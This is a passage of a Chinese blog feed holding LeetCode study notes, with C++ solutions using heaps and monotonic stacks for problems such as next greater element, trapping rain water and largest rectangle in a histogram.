<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment">    type：数据类型；</span></span><br><span class="line"><span class="comment">    container：实现优先队列的底层容器；</span></span><br><span class="line"><span class="comment">    function：元素之间的比较方式；</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 新规则：小顶堆 return lhs.second &gt; rhs.second;</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">mycomparison</span> &#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">const</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&amp; lhs, <span class="keyword">const</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&amp; rhs)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> lhs.second &gt; rhs.second;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">topKFrequent</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 要统计元素出现频率</span></span><br><span class="line">        unordered_map&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; map;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            map[nums[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 对频率排序</span></span><br><span class="line">        <span class="comment">// 定义一个小顶堆，大小为k</span></span><br><span class="line">        priority_queue&lt;pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;, vector&lt;pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&gt;, mycomparison&gt; pri_que;</span><br><span class="line">        <span class="comment">// 用固定大小为k的小顶堆，扫面所有频率的数值</span></span><br><span class="line">        <span class="keyword">for</span> (unordered_map&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;::iterator it = map.<span class="built_in">begin</span>(); it != map.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">            pri_que.<span class="built_in">push</span>(*it);</span><br><span class="line">            <span class="keyword">if</span> (pri_que.<span class="built_in">size</span>() &gt; k) &#123; <span class="comment">// 如果堆的大小大于了K，则队列弹出，保证堆的大小一直为k</span></span><br><span class="line">                pri_que.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 找出前K个高频元素，因为小顶堆先弹出的是最小的，所以倒序来输出到数组</span></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">result</span><span class="params">(k)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=k<span class="number">-1</span>; i&gt;=<span class="number">0</span>; i--) &#123;</span><br><span class="line">            result[i] = pri_que.<span class="built_in">top</span>().first;</span><br><span class="line">            pri_que.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="496-下一个更大元素-I——线性数组"><a href="#496-下一个更大元素-I——线性数组" class="headerlink" title="496 下一个更大元素 I——线性数组"></a>496 下一个更大元素 I——线性数组</h3><p>nums1 中数字 x 的 下一个更大元素 是指 x 在 nums2 中【对应位置右侧】的【第一个】【比 x 大的元素】。</p>
<p>给你两个 没有重复元素 的数组 nums1 和 nums2 ，下标从 0 开始计数，其中nums1 是 nums2 的子集。</p>
<p>对于每个 0 &lt;= i &lt; nums1.length ，找出满足 nums1[i] == nums2[j] 的下标 j ，并且在 nums2 确定 nums2[j] 的 下一个更大元素 。如果不存在下一个更大元素，那么本次查询的答案是 -1 。</p>
<p>返回一个长度为 nums1.length 的数组 ans 作为答案，满足 ans[i] 是如上所述的 下一个更大元素 。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    暴力 O(mn)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">nextGreaterElement</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = nums1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> n = nums2.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">res</span><span class="params">(m)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>(j&lt;n &amp;&amp; nums2[j] != nums1[i])&#123;</span><br><span class="line">                j++;<span class="comment">//寻找 nums2中 值和nums1[i]相等的 下标</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> k=j+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(k&lt;n &amp;&amp; nums2[k] &lt; nums1[i])&#123;</span><br><span class="line">                k++;</span><br><span class="line">            &#125;</span><br><span class="line">            res[i] = k&lt;n? nums2[k]:<span class="number">-1</span>;<span class="comment">//k!=n</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    单调栈+哈希表O(m+n) </span></span><br><span class="line"><span class="comment">    unordered_map&lt;int,int&gt; hashmap;</span></span><br><span class="line"><span class="comment">    返回：值，值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">nextGreaterElement</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; hashmap;</span><br><span class="line">        stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=nums2.<span class="built_in">size</span>()<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;<span class="comment">//倒叙遍历nums2</span></span><br><span class="line">            <span class="keyword">int</span> num = nums2[i];</span><br><span class="line">            <span class="keyword">while</span>(!stk.<span class="built_in">empty</span>() &amp;&amp; num&gt;=stk.<span class="built_in">top</span>())&#123;<span class="comment">//当前元素大于 栈顶元素</span></span><br><span class="line">                stk.<span class="built_in">pop</span>();<span class="comment">//弹出 栈中比当前元素小的 元素</span></span><br><span class="line">            &#125;</span><br><span class="line">            hashmap[num] = stk.<span class="built_in">empty</span>()?<span class="number">-1</span>:stk.<span class="built_in">top</span>();<span class="comment">//将每个元素对应的 最大元素存于哈希表中</span></span><br><span class="line">            stk.<span class="built_in">push</span>(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">res</span><span class="params">(nums1.size())</span></span>;<span class="comment">//结果存放</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums1.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            res[i] = hashmap[nums1[i]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="503-下一个更大元素-II——循环数组"><a href="#503-下一个更大元素-II——循环数组" class="headerlink" title="503 下一个更大元素 II——循环数组"></a>503 下一个更大元素 II——循环数组</h3><p><strong>循环搜寻</strong><br>给定一个循环数组 nums（nums[nums.length-1] 的下一个元素是 nums[0] ），返回 nums 中每个元素的 下一个更大元素 。<br>数字 x 的 下一个更大的元素 是按数组遍历顺序，这个数字之后的第一个比它更大的数，这意味着你应该循环地搜索它的下一个更大的数。如果不存在，则输出 -1 。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    单调栈 + 循环数组O(n)</span></span><br><span class="line"><span class="comment">    返回：值，下标</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">nextGreaterElements</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">ret</span><span class="params">(n,<span class="number">-1</span>)</span></span>;</span><br><span class="line">        stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n*<span class="number">2</span><span class="number">-1</span>;i++)&#123;<span class="comment">//遍历两遍</span></span><br><span class="line">            <span class="keyword">while</span>(!stk.<span class="built_in">empty</span>() &amp;&amp; nums[stk.<span class="built_in">top</span>()]&lt;nums[i%n])&#123;</span><br><span class="line">                ret[stk.<span class="built_in">top</span>()] = nums[i%n];</span><br><span class="line">                stk.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            stk.<span class="built_in">push</span>(i%n);<span class="comment">//栈中存放的是 下标</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="480-滑动窗口中位数"><a href="#480-滑动窗口中位数" class="headerlink" title="480 滑动窗口中位数"></a>480 滑动窗口中位数</h3><p>【<strong>中位数</strong>】：是【有序序列】【最中间】的那个数。<br>如果序列的长度是偶数，则没有最中间的数；此时中位数是最中间的两个数的平均数。</p>
<pre><code>[2,3,4]，中位数是 3
[2,3]，中位数是 (2 + 3) / 2 = 2.5
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/6c455fcdc8b24812ab49bff1d6e3d23a.png"><br><strong>动态维护数组的中位数</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    priority_queue&lt;<span class="keyword">int</span>&gt; small;</span><br><span class="line">    priority_queue&lt;<span class="keyword">int</span>, vector&lt;<span class="keyword">int</span>&gt;, greater&lt;<span class="keyword">int</span>&gt; &gt; big;</span><br><span class="line">    unordered_map&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; mp;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span>&amp; k)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(k%<span class="number">2</span>) <span class="keyword">return</span> small.<span class="built_in">top</span>();</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in"><span class="keyword">return</span></span> ((<span class="keyword">long</span> <span class="keyword">long</span>)small.<span class="built_in">top</span>()+big.<span class="built_in">top</span>())*<span class="number">0.5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">double</span>&gt; <span class="title">medianSlidingWindow</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++)&#123;small.<span class="built_in">push</span>(nums[i]);&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k / <span class="number">2</span>; i++)&#123;big.<span class="built_in">push</span>(small.<span class="built_in">top</span>()); small.<span class="built_in">pop</span>();&#125;</span><br><span class="line">        vector&lt;<span class="keyword">double</span>&gt; ans&#123;<span class="built_in">get</span>(k)&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = k; i &lt; nums.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> balance = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> l = nums[i-k];</span><br><span class="line">            mp[l]++;</span><br><span class="line">            <span class="keyword">if</span>(!small.<span class="built_in">empty</span>() &amp;&amp; l&lt;=small.<span class="built_in">top</span>())&#123;balance--;&#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;balance++;&#125;</span><br><span class="line">            <span class="keyword">if</span>(!small.<span class="built_in">empty</span>() &amp;&amp; nums[i] &lt;= small.<span class="built_in">top</span>())&#123;</span><br><span class="line">                small.<span class="built_in">push</span>(nums[i]);</span><br><span class="line">                balance++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                big.<span class="built_in">push</span>(nums[i]);</span><br><span class="line">                balance--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(balance&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                big.<span class="built_in">push</span>(small.<span class="built_in">top</span>());</span><br><span class="line">                small.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(balance&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                small.<span class="built_in">push</span>(big.<span class="built_in">top</span>());</span><br><span class="line">                big.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(!small.<span class="built_in">empty</span>() &amp;&amp; mp[small.<span class="built_in">top</span>()]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                mp[small.<span class="built_in">top</span>()]--;</span><br><span class="line">                small.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(!big.<span class="built_in">empty</span>() &amp;&amp; mp[big.<span class="built_in">top</span>()]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                mp[big.<span class="built_in">top</span>()]--;</span><br><span class="line">                big.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            ans.<span class="built_in">push_back</span>(<span class="built_in">get</span>(k));</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="739-每日温度"><a href="#739-每日温度" class="headerlink" title="739 每日温度"></a>739 每日温度</h3><p>给定一个整数数组 temperatures ，表示每天的温度，返回一个数组 answer ，其中 answer[i] 是指对于第 i 天，下一个更高温度出现在<strong>几天后</strong>【返回距离】。如果气温在这之后都不会升高，请在该位置用 0 来代替。<br>示例 1:<br>输入: temperatures = [73,74,75,71,69,72,76,73]<br>输出: [1,1,4,2,1,1,0,0]</p>
<p><strong>【单调栈】：</strong><br><strong>找到某元素左边 和 右边 第一个比它 大或小的元素。</strong></p>
<ul>
<li>求右边|左边 最近 【最大】的元素：递增栈</li>
<li>求右边|左边 最近 【最小】的元素：递减栈<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    单调栈：存下标、递增    小------&gt;大</span></span><br><span class="line"><span class="comment">    记录之前遍历过的元素，与当前元素作个对比</span></span><br><span class="line"><span class="comment">    当遍历到当前元素时t[i]</span></span><br><span class="line"><span class="comment">    if(t[i]&gt;stk.top())//对于下标是stk.top()的元素来说，已经找到了元素t[i]比它大了，则进行装入结果集</span></span><br><span class="line"><span class="comment">    &#123;   res[stk.top()]=i-stk.top();</span></span><br><span class="line"><span class="comment">        stk.pop();&#125;//应该弹出，因为该栈顶元素已经有了结果了，为了保证单调栈是递增的！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dailyTemperatures</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = t.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>) <span class="keyword">return</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        stack&lt;<span class="keyword">int</span>&gt; stk;<span class="comment">//单调递增栈：记录下标</span></span><br><span class="line">        stk.<span class="built_in">push</span>(<span class="number">0</span>);<span class="comment">//装入下标0</span></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">res</span><span class="params">(n,<span class="number">0</span>)</span></span>;<span class="comment">//这里直接初始化0，后面不用再写</span></span><br><span class="line">        <span class="keyword">while</span>(i&lt;n)&#123;</span><br><span class="line">            <span class="keyword">while</span>(!stk.<span class="built_in">empty</span>() &amp;&amp; t[i]&gt;t[stk.<span class="built_in">top</span>()])&#123;<span class="comment">//注意判断顺序！ 并且 是while</span></span><br><span class="line">                res[stk.<span class="built_in">top</span>()] = i-stk.<span class="built_in">top</span>();<span class="comment">//距离集</span></span><br><span class="line">                stk.<span class="built_in">pop</span>();<span class="comment">//弹出</span></span><br><span class="line">            &#125;</span><br><span class="line">            stk.<span class="built_in">push</span>(i);<span class="comment">//装入</span></span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        while(!stk.empty())&#123;//最后还在栈中的 下标元素 说明找不到下一个比它大的元素</span></span><br><span class="line"><span class="comment">            res[stk.top()] = 0;</span></span><br><span class="line"><span class="comment">            stk.pop();//弹出</span></span><br><span class="line"><span class="comment">        &#125;*/</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="42-接雨水"><a href="#42-接雨水" class="headerlink" title="42 接雨水"></a>42 接雨水</h3>给定 n 个非负整数表示每个宽度为 1 的柱子的高度图，计算按此排列的柱子，下雨之后能接多少雨水。<br><img src="https://img-blog.csdnimg.cn/d141be2108164ed4a2971409ad35bda0.png"></li>
</ul>
<p><strong>分析：</strong><br>每个柱子能盛水的深度，取决于【**min(左边最高，右边最高)**】<br><img src="https://img-blog.csdnimg.cn/0f62d3276e7a4aa38e8080d1bf246b29.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划 O(n) O(n)</span></span><br><span class="line"><span class="comment">    预处理 leftMax(n)和rightMax(n)</span></span><br><span class="line"><span class="comment">    ans += min(leftMax[i],rightMax[i])-height[i];</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">trap</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; height)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = height.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">leftMax</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="comment">//从左向右遍历</span></span><br><span class="line">        leftMax[<span class="number">0</span>] = height[<span class="number">0</span>];<span class="comment">//从头[0]开始</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            leftMax[i] = <span class="built_in">max</span>(leftMax[i<span class="number">-1</span>],height[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">rightMax</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="comment">//从右向左遍历</span></span><br><span class="line">        rightMax[n<span class="number">-1</span>] = height[n<span class="number">-1</span>];<span class="comment">//从[n-1]尾开始</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-2</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            rightMax[i] = <span class="built_in">max</span>(rightMax[i+<span class="number">1</span>],height[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;<span class="comment">//记录结果</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            ans += <span class="built_in">min</span>(leftMax[i],rightMax[i])-height[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双指针  O(n) O(1)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">trap</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; height)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>, r = height.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> lMax = <span class="number">0</span>, rMax = <span class="number">0</span>;<span class="comment">//赋初值</span></span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(l&lt;r)&#123;</span><br><span class="line">            lMax = <span class="built_in">max</span>(height[l],lMax);</span><br><span class="line">            rMax = <span class="built_in">max</span>(height[r],rMax);</span><br><span class="line">            <span class="keyword">if</span>(height[l]&gt;=height[r])&#123;</span><br><span class="line">                ans += rMax-height[r];</span><br><span class="line">                r--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                ans += lMax-height[l];</span><br><span class="line">                l++;</span><br><span class="line">            &#125;   </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//单调栈</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">trap</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; h)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = h.<span class="built_in">size</span>();</span><br><span class="line">        stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">        <span class="keyword">if</span>(n&gt;=<span class="number">0</span>) stk.<span class="built_in">push</span>(<span class="number">0</span>);<span class="comment">//单调递增栈，存下标</span></span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;<span class="comment">//记录结果和</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(!stk.<span class="built_in">empty</span>() &amp;&amp; h[i]&gt;h[stk.<span class="built_in">top</span>()])&#123;</span><br><span class="line">                <span class="keyword">int</span> mid = stk.<span class="built_in">top</span>();<span class="comment">//中间位置下标</span></span><br><span class="line">                stk.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span>(!stk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                    <span class="keyword">int</span> height = <span class="built_in">min</span>(h[stk.<span class="built_in">top</span>()],h[i]) - h[mid];<span class="comment">//重点</span></span><br><span class="line">                    <span class="keyword">int</span> w = i-stk.<span class="built_in">top</span>()<span class="number">-1</span>;<span class="comment">//注意！w不是1</span></span><br><span class="line">                    sum += height*w;</span><br><span class="line">                &#125;    </span><br><span class="line">            &#125;</span><br><span class="line">            stk.<span class="built_in">push</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="84-柱状图中最大的矩形"><a href="#84-柱状图中最大的矩形" class="headerlink" title="84 柱状图中最大的矩形"></a>84 柱状图中最大的矩形</h3><p>给定 n 个非负整数，用来表示柱状图中各个柱子的高度。每个柱子彼此相邻，且宽度为 1 。<br>求在该柱状图中，能够勾勒出来的矩形的最大面积。<br><img src="https://img-blog.csdnimg.cn/bf0277dca0924427aaede3eb9705080c.png"><br><strong>思路：</strong><br>以每个柱子为基准，寻找其左右两边比其高度【还要小】的柱子，如果存在，则只能以较小的那个高度计算。<br>eg: 对于高度为6的柱子来说，其左边存在比6小的柱子5，右边存在比6小的柱子2，那么以6为基准，两边所能扩展的面积是5*2=10.<br><strong>本题：【单调递减栈】求左边和右边第一个比其小的元素</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//不是特别理解！！！</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">largestRectangleArea</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; h)</span> </span>&#123;</span><br><span class="line">        stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">        h.<span class="built_in">insert</span>(h.<span class="built_in">begin</span>(), <span class="number">0</span>); <span class="comment">//数组头部加入元素0</span></span><br><span class="line">        h.<span class="built_in">push_back</span>(<span class="number">0</span>);         <span class="comment">//数组尾部加入元素0</span></span><br><span class="line">        <span class="keyword">int</span> n = h.<span class="built_in">size</span>();<span class="comment">//新的n</span></span><br><span class="line">        <span class="keyword">if</span>(n&gt;=<span class="number">0</span>) stk.<span class="built_in">push</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;<span class="comment">//记录结果</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;<span class="comment">//从1开始</span></span><br><span class="line">            <span class="keyword">while</span>(!stk.<span class="built_in">empty</span>() &amp;&amp; h[i]&lt;h[stk.<span class="built_in">top</span>()])&#123;<span class="comment">//单调递减栈</span></span><br><span class="line">                <span class="keyword">int</span> mid = stk.<span class="built_in">top</span>();</span><br><span class="line">                stk.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span>(!stk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                    <span class="keyword">int</span> height = h[mid];</span><br><span class="line">                    <span class="keyword">int</span> w = i-stk.<span class="built_in">top</span>()<span class="number">-1</span>;</span><br><span class="line">                  <span class="comment">//  cout &lt;&lt; &quot;height:&quot;&lt;&lt;height&lt;&lt;&quot; w:&quot;&lt;&lt;w&lt;&lt;&quot; res:&quot;&lt;&lt;height*w&lt;&lt;endl;</span></span><br><span class="line">                    res = <span class="built_in">max</span>(res,height*w);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            stk.<span class="built_in">push</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>力扣刷题</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>力扣</tag>
      </tags>
  </entry>
  <entry>
    <title>七、数组</title>
    <url>/2025/12/03/%E4%B8%83%E3%80%81%E6%95%B0%E7%BB%84/</url>
